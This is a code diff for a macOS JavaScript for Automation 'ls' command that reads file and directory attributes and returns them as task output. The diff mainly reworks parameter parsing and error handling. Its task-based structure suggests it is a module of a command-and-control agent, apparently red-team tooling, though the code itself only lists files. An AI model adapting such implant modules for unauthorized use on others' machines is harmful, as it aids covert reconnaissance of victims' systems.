@@ -1,17 +1,18 @@
 exports.ls = function(task, command, params){
     ObjC.import('Foundation');
     try {
+        let command_params = JSON.parse(params);
         let fileManager = $.NSFileManager.defaultManager;
         let error = Ref();
-        let path = params;
-        if (params === "" || params === undefined) {
+        let path = command_params['path'];
+        if (path === "" || path === undefined) {
             path = fileManager.currentDirectoryPath.js;
             if (path === undefined || path === "") {
-                return JSON.stringify({
+                return {
                     "user_output": "Failed to get current working directory",
                     "completed": true,
                     "status": "error"
-                });
+                };
             }
         }
         if (path[0] === '"') {
@@ -22,15 +23,15 @@ exports.ls = function(task, command, params){
         }
         let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path), error));
         if (attributes !== undefined) {
-            attributes['type'] = "";
+            attributes['type'] = "F";
             attributes['files'] = [];
             if (attributes.hasOwnProperty('NSFileType') && attributes['NSFileType'] === "NSFileTypeDirectory") {
                 let error = Ref();
                 attributes['type'] = "D";
-                let files = fileManager.contentsOfDirectoryAtPathError($(path), error);
-                if (error[0].js === $().js) {
+                let files = ObjC.deepUnwrap(fileManager.contentsOfDirectoryAtPathError($(path), error));
+                if (files !== undefined) {
                     let files_data = [];
-                    let sub_files = ObjC.deepUnwrap(files);
+                    let sub_files = files;
                     if (path[path.length - 1] !== "/") {
                         path = path + "/";
                     }
@@ -66,6 +67,8 @@ exports.ls = function(task, command, params){
                         files_data.push(file_add);
                     }
                     attributes['files'] = files_data;
+                }else{
+
                 }
             }
             delete attributes['NSFileSystemFileNumber'];
@@ -89,19 +92,21 @@ exports.ls = function(task, command, params){
             delete attributes['NSFileOwnerAccountID'];
             delete attributes['NSFileGroupOwnerAccountName'];
             delete attributes['NSFileGroupOwnerAccountID'];
-            return JSON.stringify({"user_output": JSON.stringify(attributes, null, 6), "completed": true});
+            return {"user_output": JSON.stringify(attributes, null, 6), "completed": true};
+        }else{
+            return {
+                "user_output": "Failed to get attributes of file. File doesn't exist or you don't have permission to read it",
+                "completed": true,
+                "status": "error"
+            };
         }
-        return JSON.stringify({
-            "user_output": "Failed to get attributes of file",
-            "completed": true,
-            "status": "error"
-        });
+
     }catch(error){
-        return JSON.stringify({
+        return {
             "user_output": "Error: " + error.toString(),
             "completed": true,
             "status": "error"
-        });
+        };
     }
 };
 COMMAND_ENDS_HERE
